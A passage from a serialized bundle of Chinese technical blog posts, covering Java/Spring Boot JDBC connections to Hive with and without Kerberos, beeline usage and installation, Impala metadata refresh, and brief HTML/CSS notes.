encoding="UTF-8"?> \n\n < project   xmlns = " http://maven.apache.org/POM/4.0.0 "   xmlns: xsi = " http://www.w3.org/2001/XMLSchema-instance " \n   xsi: schemaLocation = " http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd " > \n   < modelVersion > 4.0.0 </ modelVersion > \n   < groupId > com.example </ groupId > \n   < artifactId > demo </ artifactId > \n   < version > 1.0-SNAPSHOT </ version > \n   < name > demo </ name > \n   \x3c!-- FIXME change it to the project\'s website --\x3e \n   < url > http://www.example.com </ url > \n   < properties > \n     < project.build.sourceEncoding > UTF-8 </ project.build.sourceEncoding > \n     < maven.compiler.source > 1.8 </ maven.compiler.source > \n     < maven.compiler.target > 1.8 </ maven.compiler.target > \n   </ properties > \n   < dependencies > \n     < dependency > \n         < groupId > org.apache.hive </ groupId > \n         < artifactId > hive-jdbc </ artifactId > \n         < version > 1.1.0 </ version > \n     </ dependency > \n     < dependency > \n         < groupId > org.apache.hadoop </ groupId > \n         < artifactId > hadoop-common </ artifactId > \n         < version > 2.6.0 </ version > \n     </ dependency > \n     \x3c!-- jdk 9 以上需要添加 --\x3e \n     < dependency > \n         < groupId > jdk.tools </ groupId > \n         < artifactId > jdk.tools </ artifactId > \n         < version > 1.6 </ version > \n         < scope > system </ scope > \n         < systemPath > C:\\Program Files\\Eclipse Foundation\\jdk-8.0.302.8-hotspot\\lib\\tools.jar </ systemPath >                  \n     </ dependency > \n     < dependency > \n       < groupId > junit </ groupId > \n       < artifactId > junit </ artifactId > \n       < version > 4.11 </ version > \n       < scope > test </ scope > \n     </ dependency > \n   </ dependencies > \n   < build > \n   </ build > \n </ project > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 jdbc连接hive \n import   java . sql . Connection ; \n import   java . sql . DriverManager ; \n import   java . sql . PreparedStatement ; \n import   java . sql . ResultSet ; \n import   java . sql . ResultSetMetaData ; \n import   java . sql . SQLException ; \n import   java . util . ArrayList ; \n import   java . util . HashMap ; \n import   java . util . List ; \n import   java . util . Map ;     \n\n     public   static   void   main ( String [ ]  args )   throws   ClassNotFoundException ,   SQLException   { \n         List < Map < String ,   Object > >  resultList  =   connectToHive ( ) ; \n         System . out . println ( resultList ) ; \n     } \n\n     /**\n     * jdbc 连接 hive, 无kerberos认证\n     * \n     * @return\n     * @throws ClassNotFoundException\n     * @throws SQLException\n     */ \n     private   static   List < Map < String ,   Object > >   connectToHive ( )   throws   ClassNotFoundException ,   SQLException   { \n         String  url  =   "jdbc:hive2://110.40.137.191:10000/testdb" ; \n         String  driver  =   "org.apache.hive.jdbc.HiveDriver" ; \n         String  username  =   "" ; \n         String  password  =   "" ; \n         String  sql  =   "select * from employee" ; \n         Connection  connection  =   null ; \n         Class . forName ( driver ) ; \n        connection  =   DriverManager . getConnection ( url ,  username ,  password ) ; \n         // Statement statement = connection.createStatement(); \n         // ResultSet resultSet = statement.executeQuery(sql); \n\n         PreparedStatement  pstmt  =  connection . prepareStatement ( sql ) ; \n         // pstmt.setInt(1, 1); \n         // pstmt.setString(2, "2"); \n         ResultSet  resultSet  =  pstmt . executeQuery ( ) ; \n         List < Map < String ,   Object > >  resultList  =   convertList ( resultSet ) ; \n        resultSet . close ( ) ; \n        pstmt . close ( ) ; \n        connection . close ( ) ; \n         return  resultList ; \n     } \n\n import   java . io . IOException ; \n import   java . sql . Connection ; \n import   java . sql . DriverManager ; \n import   java . sql . PreparedStatement ; \n import   java . sql . ResultSet ; \n import   java . sql . ResultSetMetaData ; \n import   java . sql . SQLException ; \n import   java . util . ArrayList ; \n import   java . util . HashMap ; \n import   java . util . List ; \n import   java . util . Map ; \n\n import   org . apache . hadoop . conf . Configuration ; \n import   org . apache . hadoop . security . UserGroupInformation ; \n\n     public   static   void   main ( String [ ]  args )   throws   ClassNotFoundException ,   SQLException ,   IOException   { \n\n         // kerberos 认证 \n         kerberosAuth ( ) ; \n         List < Map < String ,   Object > >  resultList  =   connectToHiveWithKerBeros ( ) ; \n         System . out . println ( resultList ) ; \n     } \n\n     /**\n     * kerberos 认证\n     * \n     * @throws IOException\n     * \n     * \n     */ \n     public   static   void   kerberosAuth ( )   throws   IOException   { \n\n         // kdc server 直接复制出来 默认路径 /etc/krb5.conf \n         System . setProperty ( "java.security.krb5.conf" ,   "krb5.conf" ) ; \n         Configuration  conf  =   new   Configuration ( ) ; \n        conf . setBoolean ( "hadoop.security.authorization" ,   true ) ; \n        conf . set ( "hadoop.security.authentication" ,   "kerberos" ) ; \n         UserGroupInformation . setConfiguration ( conf ) ; \n         UserGroupInformation . loginUserFromKeytab ( "hdfs/quickstart.cloudera@CLOUDERA" ,   "hdfs.keytab" ) ; \n     } \n\n     /**\n     * jdbc 连接 hive，使用kerberos 认证\n     * \n     * @return\n     * @throws ClassNotFoundException\n     * @throws SQLException\n     * @throws IOException\n     */ \n     private   static   List < Map < String ,   Object > >   connectToHiveWithKerBeros ( ) \n             throws   ClassNotFoundException ,   SQLException ,   IOException   { \n         String  url  =   "jdbc:hive2://110.42.214.104:10000/default;principal=hive/quickstart.cloudera@CLOUDERA" ; \n         String  driver  =   "org.apache.hive.jdbc.HiveDriver" ; \n\n         String  sql  =   "select * from customers" ; \n         Connection  connection  =   null ; \n         Class . forName ( driver ) ; \n        connection  =   DriverManager . getConnection ( url ) ; \n         // Statement statement = connection.createStatement(); \n         // ResultSet resultSet = statement.executeQuery(sql); \n\n         PreparedStatement  pstmt  =  connection . prepareStatement ( sql ) ; \n         // pstmt.setInt(1, 1); \n         // pstmt.setString(2, "2"); \n         ResultSet  resultSet  =  pstmt . executeQuery ( ) ; \n         List < Map < String ,   Object > >  resultList  =   convertList ( resultSet ) ; \n        resultSet . close ( ) ; \n        pstmt . close ( ) ; \n        connection . close ( ) ; \n         return  resultList ; \n     } \n\n     /**\n     * 将ResultSet结果集遍历到List中\n     * \n     * @param rs\n     * @return\n     * @throws SQLException\n     */ \n     private   static   List < Map < String ,   Object > >   convertList ( ResultSet  rs )   throws   SQLException   { \n         List < Map < String ,   Object > >  list  =   new   ArrayList < > ( ) ; \n         ResultSetMetaData  md  =  rs . getMetaData ( ) ; // 获取键名 \n         int  columnCount  =  md . getColumnCount ( ) ; // 获取行的数量 \n         while   ( rs . next ( ) )   { \n             Map < String ,   Object >  rowData  =   new   HashMap < > ( ) ; // 声明Map \n             for   ( int  i  =   1 ;  i  <=  columnCount ;  i ++ )   { \n                rowData . put ( md . getColumnName ( i ) ,  rs . getObject ( i ) ) ; // 获取键名及值 \n             } \n            list . add ( rowData ) ; \n         } \n         return  list ; \n     } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 #  集成到spring boot中，使用DataSourceSpy/JdbcTemplate 连接 \n pom.xml \n < project   xmlns = " http://maven.apache.org/POM/4.0.0 "   xmlns: xsi = " http://www.w3.org/2001/XMLSchema-instance "   xsi: schemaLocation = " http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd " > \n     < modelVersion > 4.0.0 </ modelVersion > \n\n     < groupId > com.example </ groupId > \n     < artifactId > demo2 </ artifactId > \n     < version > 1.0-SNAPSHOT </ version > \n     < packaging > jar </ packaging > \n\n     < name > Spring Boot Blank Project (from https://github.com/making/spring-boot-blank) </ name > \n\n     < parent > \n         < groupId > org.springframework.boot </ groupId > \n         < artifactId > spring-boot-starter-parent </ artifactId > \n         < version > 1.2.7.RELEASE </ version > \n     </ parent > \n\n     < properties > \n         < project.build.sourceEncoding > UTF-8 </ project.build.sourceEncoding > \n         < start-class > com.example.App </ start-class > \n         < java.version > 1.8 </ java.version >         \n         < log4jdbc.log4j2.version > 1.16 </ log4jdbc.log4j2.version > \n         < rest.assured.version > 2.3.3 </ rest.assured.version > \n     </ properties > \n\n     < dependencies > \n         < dependency > \n             < groupId > org.springframework.boot </ groupId > \n             < artifactId > spring-boot-starter-web </ artifactId > \n         </ dependency > \n         < dependency > \n             < groupId > org.springframework.boot </ groupId > \n             < artifactId > spring-boot-starter-jdbc </ artifactId > \n         </ dependency > \n         < dependency > \n             < groupId > org.bgee.log4jdbc-log4j2 </ groupId > \n             < artifactId > log4jdbc-log4j2-jdbc4.1 </ artifactId > \n             < version > ${log4jdbc.log4j2.version} </ version > \n         </ dependency > \n         < dependency > \n             < groupId > org.apache.hive </ groupId > \n             < artifactId > hive-jdbc </ artifactId > \n             < version > 1.1.0 </ version > \n             < exclusions > \n                 < exclusion > \n                     < groupId > org.eclipse.jetty.aggregate </ groupId > \n                     < artifactId > jetty-all </ artifactId > \n                 </ exclusion > \n             </ exclusions > \n         </ dependency > \n         < dependency > \n             < groupId > org.apache.hadoop </ groupId > \n             < artifactId > hadoop-common </ artifactId > \n             < version > 2.6.0 </ version > \n         </ dependency >        \n\n         \x3c!-- jdk 9 以上需要添加 --\x3e \n         < dependency > \n             < groupId > jdk.tools </ groupId > \n             < artifactId > jdk.tools </ artifactId > \n             < version > 1.6 </ version > \n             < scope > system </ scope > \n             < systemPath > C:\\Program Files\\Eclipse Foundation\\jdk-8.0.302.8-hotspot\\lib\\tools.jar </ systemPath >                  \n         </ dependency > \n\n         < dependency > \n             < groupId > org.springframework.boot </ groupId > \n             < artifactId > spring-boot-starter-test </ artifactId > \n             < scope > test </ scope > \n         </ dependency > \n     </ dependencies > \n     < build > \n         < plugins > \n             < plugin > \n                 < groupId > org.springframework.boot </ groupId > \n                 < artifactId > spring-boot-maven-plugin </ artifactId > \n                 < configuration > \n                     < excludes > \n                         < exclude > \n                             < groupId > org.projectlombok </ groupId > \n                             < artifactId > lombok </ artifactId > \n                         </ exclude > \n                     </ excludes > \n                 </ configuration > \n             </ plugin > \n             \x3c!-- 该插件的作用是用于复制指定的文件 --\x3e \n             < plugin > \n                 < artifactId > maven-resources-plugin </ artifactId > \n                 < executions > \n                     < execution >   \x3c!-- 复制配置文件 --\x3e \n                         < id > copy-resources </ id > \n                         < phase > package </ phase > \n                         < goals > \n                             < goal > copy-resources </ goal > \n                         </ goals > \n                         < configuration > \n                             < resources > \n                                 < resource > \n                                     < directory > conf/ </ directory > \n                                     < includes > \n                                         < include > *.* </ include > \n                                     </ includes > \n                                 </ resource > \n                             </ resources > \n                             < outputDirectory > ${project.build.directory}/conf </ outputDirectory > \n                         </ configuration > \n                     </ execution > \n                 </ executions > \n             </ plugin >               \n         </ plugins >                       \n     </ build > \n </ project > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 App.java \n package   com . example ; \n\n import   org . springframework . boot . SpringApplication ; \n import   org . springframework . boot . autoconfigure . SpringBootApplication ; \n\n @SpringBootApplication \n public   class   App   { \n     public   static   void   main ( String [ ]  args )   { \n         SpringApplication . run ( App . class ,  args ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 DataSourceConfig.java \n package   com . example . config ; \n\n import   java . io . IOException ; \n\n import   javax . sql . DataSource ; \n\n import   org . apache . hadoop . security . UserGroupInformation ; \n import   org . springframework . beans . factory . annotation . Qualifier ; \n import   org . springframework . beans . factory . annotation . Value ; \n import   org . springframework . boot . autoconfigure . jdbc . DataSourceBuilder ; \n import   org . springframework . boot . context . properties . ConfigurationProperties ; \n import   org . springframework . context . annotation . Bean ; \n import   org . springframework . context . annotation . Configuration ; \n import   org . springframework . context . annotation . Primary ; \n import   org . springframework . jdbc . core . JdbcTemplate ; \n\n @Configuration \n public   class   DataSourceConfig   { \n\n     /**\n     * 无认证数据源配置\n     * \n     * @return\n     */ \n     @Bean \n     @ConfigurationProperties ( prefix  =   "hive-datasource" ) \n     @Primary \n     public   DataSource   setNoAuthDatasource ( )   { \n         return   DataSourceBuilder . create ( ) . build ( ) ; \n     } \n\n     /**\n     * \n     * 无认证jdbc连接\n     * \n     */ \n     @Bean \n     @Primary \n     JdbcTemplate   getNoAuthDatasourceJdbc ( DataSource  dataSource )   { \n         return   new   JdbcTemplate ( dataSource ) ; \n     } \n\n     /**\n     * kerberos认证数据源配置\n     * \n     * @return\n     */ \n     @Bean ( name  =   "kerberosDatasource" ) \n     @ConfigurationProperties ( prefix  =   "hive_kerberos-datasource" ) \n     DataSource   kerberosDatasource ( )   { \n\n         // kerberos 认证 \n         kerberosAuth ( ) ; \n         return   DataSourceBuilder . create ( ) . build ( ) ; \n     } \n\n     /**\n     * \n     * kerberos认证jdbc连接\n     * \n     */ \n     @Bean ( name  =   "kerberosJdbcTemplate" ) \n     JdbcTemplate   kerberosJdbcTemplate ( @Qualifier ( "kerberosDatasource" )   DataSource  dataSource )   { \n         return   new   JdbcTemplate ( dataSource ) ; \n     } \n\n     /**\n     * \n     * 可以在控制台看到执行结果,不支持低版本jdbc驱动\n     * \n     * @throws IOException\n     * \n     */ \n     // @Bean \n     // @Primary \n     // DataSourceSpy dataSource2() { \n\n     // return new DataSourceSpy(realDataSource()); \n     // } \n     @Value ( "${hive_kerberos-datasource.krb5conf}" ) \n     private   String  krb5conf ; \n     @Value ( "${hive_kerberos-datasource.krb5keytab}" ) \n     private   String  krb5keytab ; \n     @Value ( "${hive_kerberos-datasource.principal}" ) \n     private   String  principal ; \n\n     /**\n     * kerberos 认证\n     * \n     * @throws IOException\n     * \n     * \n     */ \n     public   void   kerberosAuth ( )   { \n\n         // kdc server 直接复制出来 默认路径 /etc/krb5.conf \n         System . setProperty ( "java.security.krb5.conf" ,  krb5conf ) ; \n         System . setProperty ( "sun.security.krb5.debug" ,   "true" ) ; \n         org . apache . hadoop . conf . Configuration  conf  =   new   org . apache . hadoop . conf . Configuration ( ) ; \n        conf . setBoolean ( "hadoop.security.authorization" ,   true ) ; \n        conf . set ( "hadoop.security.authentication" ,   "kerberos" ) ; \n         UserGroupInformation . setConfiguration ( conf ) ; \n         try   { \n             UserGroupInformation . loginUserFromKeytab ( principal ,  krb5keytab ) ; \n             System . out . println ( "kerberos 认证成功" ) ; \n         }   catch   ( Exception  e )   { \n             System . out . println ( "kerberos 认证失败" ) ; \n         } \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 HiveController.java \n package   com . example ; \n\n import   java . util . List ; \n import   java . util . Map ; \n\n import   org . slf4j . Logger ; \n import   org . slf4j . LoggerFactory ; \n import   org . springframework . beans . factory . annotation . Autowired ; \n import   org . springframework . beans . factory . annotation . Qualifier ; \n import   org . springframework . jdbc . core . JdbcTemplate ; \n import   org . springframework . jdbc . core . namedparam . NamedParameterJdbcTemplate ; \n import   org . springframework . web . bind . annotation . RequestMapping ; \n import   org . springframework . web . bind . annotation . RestController ; \n import   org . springframework . web . servlet . ModelAndView ; \n\n // import lombok.Data; \n\n @RestController \n public   class   HiveController   { \n     @Autowired \n     NamedParameterJdbcTemplate  jdbcTemplate ; \n\n     @Autowired \n     JdbcTemplate  jdbcTemplate2 ; \n\n     @Autowired \n     @Qualifier ( "kerberosJdbcTemplate" ) \n     JdbcTemplate  kerberosJdbcTemplate ; \n     private   static   final   Logger  logger  =   LoggerFactory . getLogger ( HiveController . class ) ; \n\n     @RequestMapping ( "/" ) \n     String   hello ( )   { \n         return   "Hello World!" ; \n     } \n\n     @RequestMapping ( "/createSuccessful" ) \n     String   createSuccessful ( )   { \n         return   "createSuccessful!" ; \n     } \n\n     // @Data \n     // static class Result { \n     // private final int left; \n     // private final int right; \n     // private final long answer; \n     // } \n\n     // // SQL sample \n     // @RequestMapping("calc") \n     // Result calc(@RequestParam int left, @RequestParam int right) { \n     // MapSqlParameterSource source = new MapSqlParameterSource().addValue("left", \n     // left).addValue("right", right); \n     // return jdbcTemplate.queryForObject("SELECT :left + :right AS answer", source, \n     // (rs, rowNum) -> new Result(left, right, rs.getLong("answer"))); \n     // } \n\n     @RequestMapping ( "/create" ) \n     public   ModelAndView   create ( )   { \n\n         StringBuffer  sql  =   new   StringBuffer ( "create table IF NOT EXISTS " ) ; \n        sql . append ( "HIVE_TEST" ) ; \n        sql . append ( "(KEY STRING, VALUE STRING)" ) ; \n         // sql.append("PARTITIONED BY (KEY STRING)"); // 分区存储 \n        sql . append ( "ROW FORMAT DELIMITED FIELDS TERMINATED BY \'\\t\' LINES TERMINATED BY \'\\n\' " ) ;   // 定义分隔符 \n        sql . append ( "STORED AS TEXTFILE" ) ;   // 作为文本存储 \n\n         // drop table \n         // StringBuffer sql = new StringBuffer("DROP TABLE IF EXISTS "); \n         // sql.append("HIVE_TEST1"); \n        logger . info ( sql . toString ( ) ) ; \n        jdbcTemplate2 . execute ( sql . toString ( ) ) ; \n         return   new   ModelAndView ( "/createSuccessful" ) ; \n     } \n\n     @RequestMapping ( "/insert" ) \n     public   String   insert ( )   { \n        jdbcTemplate2 . execute ( "insert into hive_test(key, value) values(\'Neo\',\'Chen\')" ) ; \n         return   "Done" ; \n     } \n\n     @RequestMapping ( "/selectNoauthDb" ) \n     public   List < Map < String ,   Object > >   select ( )   { \n         String  sql  =   "select key, value from HIVE_TEST" ; \n         return  jdbcTemplate2 . queryForList ( sql ) ; \n     } \n\n     @RequestMapping ( "/selectKerberosDb" ) \n     public   List < Map < String ,   Object > >   select2 ( )   { \n         String  sql  =   "select * from customers" ; \n         return  kerberosJdbcTemplate . queryForList ( sql ) ; \n     } \n\n     @RequestMapping ( "/drop" ) \n     public   String   drop ( )   { \n         StringBuffer  sql  =   new   StringBuffer ( "DROP TABLE IF EXISTS " ) ; \n        sql . append ( "HIVE_TEST" ) ; \n        logger . info ( sql . toString ( ) ) ; \n        jdbcTemplate2 . execute ( sql . toString ( ) ) ; \n         return   "Done" ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 application.yml \n server : \n   address :  0.0.0.0\n   port :   8080 \n spring : \n   datasource : \n     url :  jdbc : hive2 : //110.40.137.191 : 10000/testdb\n     driverClassName :  org.apache.hive.jdbc.HiveDriver\n logging : \n   level : \n     jdbc : \n       sqltiming :  DEBUG\n       resultsettable :  DEBUG\n hive-datasource : \n   url :  jdbc : hive2 : //110.40.137.191 : 10000/testdb\n   driver-class-name :  org.apache.hive.jdbc.HiveDriver\n hive_kerberos-datasource : \n   url :  jdbc : hive2 : //110.42.214.104 : 10000/default;principal=hive/quickstart.cloudera@CLOUDERA\n   driver-class-name :  org.apache.hive.jdbc.HiveDriver\n   krb5conf :  conf/krb5.conf\n   krb5keytab :  conf/hdfs.keytab\n   principal :  hdfs/quickstart.cloudera@CLOUDERA\n\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #  bash 使用 beeline 连接 \n 连接模版 \n beeline -u url -e sql\n \n 1 可以执行多个sql \n 连接例子 \n beeline -u  \'jdbc:hive2://110.40.137.191:10000/testdb\'  -e  \'show databases\'  -e  \'select * from employee\' \n \n 1 '},{title:"Impala更新元数据：invalidate metadata和refresh",frontmatter:{title:"Impala更新元数据：invalidate metadata和refresh",date:"2021-12-19 18:36:26",tags:["impala","hive"],categories:"big-data",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/hive/hive_impala_update_metadata.html",relativePath:"blogs/hive/hive_impala_update_metadata.md",key:"v-f0b0fff6",path:"/blogs/hive/hive_impala_update_metadata.html",headers:[{level:2,title:"refresh",slug:"refresh"},{level:2,title:"invalidate metadata",slug:"invalidate-metadata"},{level:2,title:"更新元数据的使用",slug:"更新元数据的使用"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" refresh \n 对于通过hive加载，插入，改变的数据操作，或者通过hdfs对数据进行改变的操作，impala都无法自动识别数据的变化，可以使用 refresh table_name ，该语句可以让impala识别到数据的变化，可以对某张表更新元数据，也可以对某张表的某分区更新元数据。 \n refresh  [ table ] ;                            -- 刷新表table的元数据\nrefresh  [ table ]  partition  [ partition ] ;      -- 刷新表table的partition分区元数据\n \n 1 2 #  invalidate metadata \n 对于通过Hive创建，删除或者修改表等操作，Impala无法自动感知到Hive元数据的变化，想让Impala识别到这个变化需要在impala shell中输入 invalidate metadata ，该语句会使得impala原元数据失效并且重新从元数据库同步元数据信息。可以对所有表执行，也可以指定某张表 \n invalidate metadata ;            -- tongbu所有表的元数据\ninvalidate metadata  [ table ] ;    -- 废除表table的元数据\n \n 1 2 #  更新元数据的使用 \n \n invalidate metadata 会加载相关表的所有元数据信息，这个操作对于有很多分区的大表成本非常高，refresh加载元数据更快，因为它只要加载新增的数据文件块的位置数据 \n 如果数仓中发生了增删表或改变表结构的行为，如create table、drop table、alter table add column等，就使用invalidate metadata [table]语句。 \n 如果数仓中某表加入了新数据，或者有分区的改动，如load data、alter table add partition等，就使用refresh [table] (partition [partition])语句。 \n invalidate metadata比起refresh而言要重量级得多，并且它造成impalad之间查询不一致也会更严重。因此，也几乎禁止使用 不带表名的invalidate metadata语句。 \n 如果数仓中涉及到非常大批量的元数据更改，那么建议直接重启catalogd和statestored，这总比使用不带表名的invalidate metadata来得高效一些。 \n \n"},{title:"hive命令行显示当前数据库",frontmatter:{title:"hive命令行显示当前数据库",date:"2021-10-09 22:53:50",tags:["hive"],categories:"big-data",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/hive/hive_show_useddatabase.html",relativePath:"blogs/hive/hive_show_useddatabase.md",key:"v-7f803556",path:"/blogs/hive/hive_show_useddatabase.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 在 hive命令行不知道当前数据库有时会带来麻烦。 \n 1、可以在hive命令行执行以下语句显示当前数据库： \n select  current_database ( ) ; \n \n 1 2、可以设置hive属性在命令行显示当前数据库： \n set  hive.cli.print.current.db = true ; \n \n 1 "},{title:"ubuntu 安装 beeline",frontmatter:{title:"ubuntu 安装 beeline",date:"2021-09-25 15:59:52",tags:["beeline","ubuntu","hive"],categories:"big-data",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/hive/linux_install_beeline.html",relativePath:"blogs/hive/linux_install_beeline.md",key:"v-702c0696",path:"/blogs/hive/linux_install_beeline.html",headers:[{level:2,title:"If no java package is installed, enter the following command:",slug:"if-no-java-package-is-installed-enter-the-following-command"},{level:2,title:"Open the bashrc file (often found in ~/.bashrc):",slug:"open-the-bashrc-file-often-found-in-bashrc"},{level:2,title:"Amend the bashrc file. Add the following line at the end of the file:",slug:"amend-the-bashrc-file-add-the-following-line-at-the-end-of-the-file"},{level:2,title:"Open the file: nano ~/.bashrc",slug:"open-the-file-nano-bashrc"},{level:2,title:"Modify the commands below with the appropriate path and then enter them at the end of the bashrc file:",slug:"modify-the-commands-below-with-the-appropriate-path-and-then-enter-them-at-the-end-of-the-bashrc-file"},{level:2,title:"Then press Ctrl+X, then Y, then enter.",slug:"then-press-ctrl-x-then-y-then-enter"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" Although Beeline is included on the head nodes, you may want to install it locally. The install steps for a local machine are based on a Windows Subsystem for Linux. \n Update package lists. Enter the following command in your bash shell: \n sudo   apt-get  update\n \n 1 #  Install Java if not installed. You can check with the which java command. \n java -version\n \n 1 #  If no java package is installed, enter the following command: \n sudo   apt   install  openjdk-8-jre-headless\n \n 1 #  Open the bashrc file (often found in ~/.bashrc): \n nano  ~/.bashrc\n \n 1 #  Amend the bashrc file. Add the following line at the end of the file: \n export   JAVA_HOME = /usr/lib/jvm/java-1.8.0-openjdk-amd64\n \n 1 Then press Ctrl+X, then Y, then enter. \n Download Hadoop and Beeline archives, enter the following commands: \n wget  https://archive.apache.org/dist/hadoop/core/hadoop-2.7.3/hadoop-2.7.3.tar.gz\n wget  https://archive.apache.org/dist/hive/hive-1.2.1/apache-hive-1.2.1-bin.tar.gz\n \n 1 2 #  Unpack the archives, enter the following commands: \n tar  -xvzf hadoop-2.7.3.tar.gz\n tar  -xvzf apache-hive-1.2.1-bin.tar.gz\n \n 1 2 #  Further amend the bashrc file. You'll need to identify the path to where the archives were unpacked. If using the Windows Subsystem for Linux, and you followed the steps exactly, your path would be /mnt/c/Users/user/, where user is your user name. \n Open the file:  nano ~/.bashrc \n Modify the commands below with the appropriate path and then enter them at the end of the bashrc file: \n export   HADOOP_HOME = /path_where_the_archives_were_unpacked/hadoop-2.7.3\n export   HIVE_HOME = /path_where_the_archives_were_unpacked/apache-hive-1.2.1-bin\n PATH = $PATH : $HIVE_HOME /bin\n \n 1 2 3 #  Then press Ctrl+X, then Y, then enter. \n Close and then reopen you bash session. \n Test your connection. Use the connection format from Over public or private endpoints, above. \n"},{title:"html 中引用资源路径问题",frontmatter:{title:"html 中引用资源路径问题",date:"2021-05-15T12:51:09.000Z",tags:["html"],categories:"front-end-html",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/html/html-zhong-yin-yong-zi-yuan-lu-jing-wen-ti.html",relativePath:"blogs/html/html-zhong-yin-yong-zi-yuan-lu-jing-wen-ti.md",key:"v-6cf5afb5",path:"/blogs/html/html-zhong-yin-yong-zi-yuan-lu-jing-wen-ti.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' ../和./和/的区别 \n ./ 当前目录\n../ 父级目录\n/ 根目录 \n ./SRC/  这样写表示，当前目录中的SRC文件夹；  ../SRC/  这样写表示，当前目录的上一层目录中SRC文件夹； /SRC/   这样写表示，项目根目录（可以指磁盘根目录，也可以指项目根目录，具体根据实际情况而定） \n 比如说 C:\\Users\\jj\\Desktop\\colors7\\index.html 中 的 <link type="text/css" href="/css/index.css"> 会跳到 file:///C:/css/index.css  。就报错啦 \n 什么？ 你要直接写 href="css/index.css"？目前的测试效果是等同于当前目录，即./ \n'},{title:"html 滚动条拉不到最底下",frontmatter:{title:"html 滚动条拉不到最底下",date:"2021-05-16T11:46:35.000Z",tags:["html","scrollbar","fixed position"],categories:"front-end-css",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/html/html_hUR_fwtxZ.html",relativePath:"blogs/html/html_hUR_fwtxZ.md",key:"v-491985b5",path:"/blogs/html/html_hUR_fwtxZ.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 容器使用绝对定位 position: fixed; 后, 高度就不会被计算在父容器里面。就会造成把一些元素遮挡住。\n解决办法：添加一个空的容器。用来代替不被计算的容器。 \n"},{title:"如何检查失去焦点后从DOM中消失的html元素",frontmatter:{title:"如何检查失去焦点后从DOM中消失的html元素",date:"2021-10-10 00:09:21",tags:["html"],categories:"front-end-html",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/html/html_how-can-i-inspect-html-element-that-disappears-from-dom-on-lost-focus.html",relativePath:"blogs/html/html_how-can-i-inspect-html-element-that-disappears-from-dom-on-lost-focus.md",key:"v-1dade755",path:"/blogs/html/html_how-can-i-inspect-html-element-that-disappears-from-dom-on-lost-focus.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 在Chrome浏览器中，打开开发人员工具，然后选择元素选项卡，然后打开要检查的元素的父节点的上下文菜单，在上下文菜单中，单击中断(break on) >子树修改(subtree modifications)。 \n 之后，您只需要单击页面，就可以进入检查器，而不会失去焦点或丢失要检查的元素。 \n"},{title:"HTML、CSS知识点总结",frontmatter:{title:"HTML、CSS知识点总结",date:"2021-05-16T09:02:55.000Z",tags:["html","css"],categories:"front-end-css",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/html/html_l-XCTPBqa.html",relativePath:"blogs/html/html_l-XCTPBqa.md",key:"v-04c6e555",path:"/blogs/html/html_l-XCTPBqa.html",headers:[{level:2,title:"Html和CSS的关系",slug:"html和css的关系"},{level:2,title:"标签大小写",slug:"标签大小写"},{level:2,title:"固定的结构",slug:"固定的结构"},{level:2,title:"head 